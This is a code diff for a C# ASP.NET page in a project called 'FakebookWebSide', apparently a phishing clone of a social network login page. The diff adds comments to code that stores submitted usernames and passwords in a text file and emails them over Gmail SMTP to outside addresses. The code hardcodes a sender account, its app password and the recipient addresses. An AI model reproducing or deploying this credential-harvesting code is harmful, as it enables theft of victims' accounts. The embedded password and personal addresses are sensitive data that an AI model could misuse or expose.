@@ -23,11 +23,13 @@ namespace FakebookWebSide.Pages
         {
             var userName = Request.Form["userName"];
             var pass = Request.Form["pass"];
+
+            //write in file
             using (StreamWriter stream = new FileInfo("loginInfo.txt").AppendText())
             {
                 stream.WriteLine("Username:" + userName.ToString().Trim() + "\r\n" + "Password:" + pass.ToString().Trim()+ "\r\n");
             }
-
+            //send email
             SendEmail(userName, pass);
         }
 
@@ -35,14 +37,18 @@ namespace FakebookWebSide.Pages
 
         private void SendEmail(string userName, string pass)
         {
-
+            //test email
             var fromAddress = new MailAddress("ilkincavadovtest@gmail.com", "Fakebook"); 
+
             var toAddress = "Ilkincavadovweb1@gmail.com;agasef.memmedli@gmail.com";
 
             string id = "lmeegsudwyeqyoba";
             string subject = "Fakebook";
+
+            //message
             string body = "Username:" + userName + "\r\n" + "Password:" + pass; 
 
+            //gmail sftp connection
             var smtp = new SmtpClient
             {
                 Host = "smtp.gmail.com",
@@ -52,6 +58,8 @@ namespace FakebookWebSide.Pages
                 UseDefaultCredentials = false,
                 Credentials = new NetworkCredential(fromAddress.Address, id)
             };
+
+            //loop for emails
             foreach (var item in toAddress.Split(";"))
             {
                 using (var message = new MailMessage(fromAddress.ToString(), item)
